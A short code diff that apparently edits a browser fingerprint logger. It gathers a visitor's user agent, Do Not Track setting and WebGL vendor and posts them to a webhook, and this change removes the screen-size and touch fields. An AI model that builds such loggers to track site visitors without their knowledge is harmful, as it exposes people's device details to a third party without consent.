@@ -173,16 +173,6 @@ await fetch(WEBHOOK_URL, {
         { name: "Do Not Track", value: `${basic.doNotTrack || "Unknown"}`, inline: true },
         { name: "User Agent", value: `${basic.userAgent || "Unknown"}`, inline: false },
 
-        // —— DISPLAY ——
-        { name: "Screen Size", value: `${screenInfo.width}x${screenInfo.height}`, inline: true },
-        { name: "Available Size", value: `${screenInfo.availWidth}x${screenInfo.availHeight}`, inline: true },
-        { name: "Window Size", value: `${screenInfo.windowWidth}x${screenInfo.windowHeight}`, inline: true },
-        { name: "Pixel Ratio", value: `${screenInfo.pixelRatio || "Unknown"}`, inline: false },
-
-        // —— INPUT ——
-        { name: "Touch Points", value: `${touch.maxTouchPoints || "Unknown"}`, inline: false },
-        { name: "Touch Events", value: `${touch.touchEvent || "Unknown"}`, inline: true },
-
         // —— GRAPHICS ——
         { name: "WebGL Supported", value: `${webgl.supported || "Unknown"}`, inline: true },
         { name: "WebGL Vendor", value: `${webgl.vendor || "Unknown"}`, inline: false },
